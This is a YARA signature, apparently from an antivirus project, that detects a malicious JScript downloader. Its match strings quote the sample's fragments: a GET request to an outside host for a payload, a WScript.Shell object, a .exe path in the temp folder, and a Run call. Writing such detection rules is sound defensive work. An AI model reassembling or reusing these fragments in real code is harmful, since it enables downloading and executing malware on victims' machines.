rule sig_20160401_f915319f065e3cc3e9fa563199b6d210 {
  meta:
    description = "datamaliciousorder - file 20160401_f915319f065e3cc3e9fa563199b6d210.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "85e4d9f8558b44a818977d54ba64120e4104a92a5d1b111a8a0ee08e75c218b9"

  strings:
    $s1  = "FqZj[IiqIal](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "var OkJsp = function BzwSnm() {return WScript[BfFyy](\"WScript\"+\".Shell\");}(), NqrZk = 11;" fullword ascii
    $s3  = "function YgwDo(XitEy, ZpQhd){LoMu = LoMu * 1; return XitEy - ZpQhd;};" fullword ascii
    $s4  = "if (FqZj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XiWs() {return OkJsp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"tHBU6HGw.ex\" + \"e\";};" fullword ascii
    $s6  = "function BpCx(){return VbXxj + \"\";};" fullword ascii
    $s7  = "function EgqZa() {return ((LsjGiw == true) && (LsjGiw == WosXw)) ? 1 : LoMu;};" fullword ascii
    $s8  = "function DysGcn(WbEm){OkJsp[\"R\"+\"un\"](WbEm, LoMu, LoMu);};" fullword ascii
    $s9  = "var YbrNzv = new this[\"Date\"]();" fullword ascii
    $s10 = "WosXw = true; " fullword ascii
    $s11 = "function YpwQj(SpqHlo) {var BwJq = (1, 2, 3, 4, 5, SpqHlo); return BwJq;};" fullword ascii
    $s12 = "LsjGiw = true; " fullword ascii
    $s13 = "function EzhRc()" fullword ascii
    $s14 = "var LonBvl = false;" fullword ascii
    $s15 = "return YgwDo(WsdJq, RdBjl);" fullword ascii
    $s16 = "function WhoRqh(){return BfFyy;};" fullword ascii
    $s17 = "var LsjGiw = false;" fullword ascii
    $s18 = "var WosXw = false;" fullword ascii
    $s19 = "function EiDcy(){return 23;};" fullword ascii
    $s20 = "}while (VfRsz);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}